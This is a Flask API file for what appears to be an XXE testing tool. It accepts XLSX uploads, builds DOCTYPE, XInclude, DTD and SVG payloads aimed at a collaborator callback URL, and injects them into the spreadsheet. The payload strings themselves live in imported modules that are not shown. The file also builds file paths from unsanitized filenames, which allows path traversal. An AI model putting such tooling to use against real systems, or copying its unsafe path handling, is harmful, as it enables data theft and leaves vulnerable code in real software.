from flask import Flask, request, jsonify, send_file
from flask_cors import CORS
import os
import sys

# Add parent directory to path for imports
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from xxe_generator import XXEGenerator
from xlsx_processor import XLSXProcessor

app = Flask(__name__)
CORS(app)

@app.route('/api/upload', methods=['POST'])
def upload_file():
    try:
        if 'file' not in request.files:
            return jsonify({'error': 'No file uploaded'}), 400
        
        file = request.files['file']
        if file.filename == '':
            return jsonify({'error': 'No file selected'}), 400
        
        if not file.filename.endswith('.xlsx'):
            return jsonify({'error': 'Only XLSX files are allowed'}), 400
        
        # Save uploaded file
        upload_path = f"/tmp/{file.filename}"
        file.save(upload_path)
        
        return jsonify({
            'message': 'File uploaded successfully',
            'filename': file.filename,
            'size': os.path.getsize(upload_path)
        })
    
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/generate', methods=['POST'])
def generate_payloads():
    try:
        data = request.get_json()
        filename = data.get('filename')
        collaborator_url = data.get('collaboratorUrl', '')
        target_url = data.get('targetUrl', '')
        attack_types = data.get('attackTypes', [])
        
        if not filename:
            return jsonify({'error': 'Filename is required'}), 400
        
        # Generate payloads
        generator = XXEGenerator()
        payloads = []
        
        for attack_type in attack_types:
            if attack_type == 'doctype':
                payload = generator.generate_doctype_payload(collaborator_url, target_url)
            elif attack_type == 'xinclude':
                payload = generator.generate_xinclude_payload(collaborator_url, target_url)
            elif attack_type == 'dtd':
                payload = generator.generate_dtd_payload(collaborator_url, target_url)
            elif attack_type == 'svg':
                payload = generator.generate_svg_payload(collaborator_url, target_url)
            else:
                continue
            
            payloads.append({
                'type': attack_type,
                'payload': payload
            })
        
        # Process XLSX file
        processor = XLSXProcessor()
        input_path = f"/tmp/{filename}"
        output_path = f"/tmp/modified_{filename}"
        
        processor.inject_payloads(input_path, output_path, payloads)
        
        return jsonify({
            'message': 'Payloads generated successfully',
            'payloads': payloads,
            'output_file': f"modified_{filename}"
        })
    
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/download/<filename>')
def download_file(filename):
    try:
        file_path = f"/tmp/{filename}"
        if os.path.exists(file_path):
            return send_file(file_path, as_attachment=True)
        else:
            return jsonify({'error': 'File not found'}), 404
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# Vercel serverless function handler
def handler(request):
    return app(request.environ, lambda status, headers: None)